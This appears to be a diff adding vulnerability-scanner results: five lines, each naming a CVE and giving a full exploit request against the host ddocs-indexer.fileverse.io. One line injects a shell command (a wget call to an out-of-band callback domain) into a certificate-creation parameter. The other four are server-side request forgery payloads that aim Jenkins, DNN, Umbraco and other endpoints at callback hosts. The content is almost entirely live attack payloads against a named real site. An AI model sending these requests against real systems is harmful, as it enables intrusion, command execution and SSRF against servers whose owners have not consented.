@@ -1,0 +1,5 @@
+[CVE-2021-33544] [http] [high] https://ddocs-indexer.fileverse.io//uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://da05jlaai4kjlh8gvtbg66zfz5381qukq.oast.pro)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything
+[CVE-2017-0929] [http] [high] https://ddocs-indexer.fileverse.io/DnnImageHandler.ashx?mode=file&url=http://da05jlaai4kjlh8gvtbguj7g1uszx1i76.oast.pro
+[CVE-2017-18638] [http] [high] https://ddocs-indexer.fileverse.io/composer/send_email?to=SHyP@rkAz&url=http://da05jlaai4kjlh8gvtbgmdbokeefzpgnn.oast.pro
+[CVE-2018-1000600] [http] [high] https://ddocs-indexer.fileverse.io/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://da05jlaai4kjlh8gvtbgbuhwtsj6zsy5r.oast.pro
+[CVE-2015-8813] [http] [high] https://ddocs-indexer.fileverse.io/Umbraco/feedproxy.aspx?url=http://da05jlaai4kjlh8gvtbgkcjfieidrtnz5.oast.pro
